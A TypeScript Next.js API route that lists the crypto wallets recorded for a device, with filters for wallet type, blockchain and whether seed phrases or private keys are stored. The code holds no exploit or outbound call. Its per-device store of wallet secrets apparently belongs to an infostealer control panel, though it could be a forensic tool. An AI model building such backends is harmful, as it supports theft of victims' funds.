import { NextRequest, NextResponse } from "next/server"
import { getCryptoWalletsByDevice, searchCryptoWallets } from "@/lib/db-messaging-helpers"

/**
 * GET /api/v1/wallets/[deviceId]
 * Get all crypto wallets for a specific device
 *
 * Query parameters:
 * - wallet_type: filter by wallet type (browser_extension, desktop_app, etc.)
 * - wallet_name: filter by wallet name (MetaMask, Exodus, etc.)
 * - blockchain: filter by blockchain (ETH, BTC, SOL, etc.)
 * - has_seed: true/false - filter by seed phrase presence
 * - has_key: true/false - filter by private key presence
 */
export async function GET(
  request: NextRequest,
  { params }: { params: { deviceId: string } },
) {
  try {
    const { deviceId } = params
    const { searchParams } = new URL(request.url)

    if (!deviceId) {
      return NextResponse.json({ error: "Device ID is required" }, { status: 400 })
    }

    // Check for filters
    const walletType = searchParams.get("wallet_type")
    const walletName = searchParams.get("wallet_name")
    const blockchain = searchParams.get("blockchain")
    const hasSeed = searchParams.get("has_seed")
    const hasKey = searchParams.get("has_key")

    let wallets

    if (walletType || walletName || blockchain || hasSeed || hasKey) {
      // Use search with filters
      wallets = await searchCryptoWallets({
        deviceId,
        walletType: walletType || undefined,
        walletName: walletName || undefined,
        blockchain: blockchain || undefined,
        hasSeedPhrase: hasSeed ? hasSeed === "true" : undefined,
        hasPrivateKey: hasKey ? hasKey === "true" : undefined,
      })
    } else {
      // Get all wallets for device
      wallets = await getCryptoWalletsByDevice(deviceId)
    }

    // Group by wallet type for better organization
    const grouped = wallets.reduce((acc, wallet) => {
      const type = wallet.wallet_type || "other"
      if (!acc[type]) acc[type] = []
      acc[type].push(wallet)
      return acc
    }, {} as Record<string, typeof wallets>)

    return NextResponse.json({
      success: true,
      device_id: deviceId,
      total: wallets.length,
      wallets,
      grouped,
      filters: {
        wallet_type: walletType,
        wallet_name: walletName,
        blockchain,
        has_seed: hasSeed,
        has_key: hasKey,
      },
    })
  } catch (error) {
    console.error("Error fetching crypto wallets:", error)
    return NextResponse.json(
      { error: "Failed to fetch crypto wallets" },
      { status: 500 },
    )
  }
}
